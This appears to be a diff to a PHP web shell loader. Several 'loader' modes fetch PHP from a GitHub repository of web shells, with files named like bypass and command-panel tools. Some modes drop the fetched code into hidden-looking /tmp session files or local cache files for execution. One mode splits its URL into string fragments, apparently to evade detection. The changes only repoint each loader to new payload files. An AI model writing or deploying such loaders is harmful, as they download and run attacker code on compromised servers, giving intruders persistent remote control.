@@ -123,7 +123,7 @@ switch($mode){
 
     // --- Loader 1: cURL ---
     case "curl":
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/VoidGateDx.php';
+        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/YamiRoot_Series/YR_VoidGateDX.php';
         $code = @file_get_contents($url);
         if ($code === false || empty($code)) {
             $ch = curl_init();
@@ -143,9 +143,9 @@ switch($mode){
     case "curlman":
         function load_content(){
             $part1 = 'ht' . 'tps://' . 'raw.' . 'github' . 'usercontent' . '.com/';
-            $part2 = '6ickzone' . '/0x6ickShell-Manager/';
+            $part2 = '6ickzone' . '/0x6NyxWebShell/YamiRoot_Series/';
             $part3 = 'refs/' . 'heads/' . 'main/';
-            $part4 = 'yami.php';
+            $part4 = 'YR_VGmini.php';
             $target_url = $part1.$part2.$part3.$part4;
             $data = '';
             if(function_exists('curl_init')){
@@ -170,7 +170,7 @@ switch($mode){
 
     // --- Loader 3: TMP File ---
     case "tmp":
-        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
+        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/YamiRoot_Series/YR_bypass.php';
         $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
         if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
             $payload = file_get_contents($payload_url);
@@ -184,8 +184,8 @@ switch($mode){
 
     // --- Loader 4: Cache File ---
     case "cache":
-        $tmp = 'cache_ym.php';
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
+        $tmp = 'cache_panel.php';
+        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/tools_helper/cmd_panel.php';
         if (!file_exists($tmp) || filesize($tmp) < 10) {
             $code = file_get_contents($url);
             file_put_contents($tmp, $code);
@@ -209,7 +209,7 @@ switch($mode){
 
     // --- Loader 6: WGET + Include ---
     case "wget":
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/simplebypass.php';
+        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/random/simple.php';
         $tmp_file = '/tmp/sess_'.md5($url).'.php';
         
         if(is_executable('/usr/bin/wget')) {
@@ -231,7 +231,7 @@ switch($mode){
     // --- Loader 7: Socket ---
     case "socket":
         $host = 'raw.githubusercontent.com';
-        $path = '/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
+        $path = '/6ickzone/0x6NyxWebShell/refs/heads/main/random/massupbye.php';
         $port = 443;
         
         $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
